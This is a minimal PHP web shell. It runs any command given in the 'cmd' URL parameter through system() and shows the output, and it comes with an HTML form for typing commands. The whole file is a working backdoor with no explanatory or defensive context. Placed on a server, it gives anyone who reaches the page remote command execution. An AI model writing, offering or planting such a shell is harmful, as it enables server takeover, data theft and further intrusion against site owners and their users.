<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Run">
</form>